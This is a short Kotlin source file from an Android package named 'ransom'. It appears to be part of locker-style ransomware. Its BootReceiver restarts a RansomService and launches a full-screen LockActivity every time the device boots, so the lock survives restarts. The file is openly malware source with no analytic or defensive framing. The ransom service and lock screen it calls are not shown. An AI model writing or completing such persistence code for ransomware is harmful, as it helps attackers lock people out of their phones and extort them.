package com.bos.ransom

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == "android.intent.action.QUICKBOOT_POWERON") {
            val svc = Intent(context, RansomService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(svc)
            else
                context.startService(svc)
            
            val lock = Intent(context, LockActivity::class.java)
            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(lock)
        }
    }
}
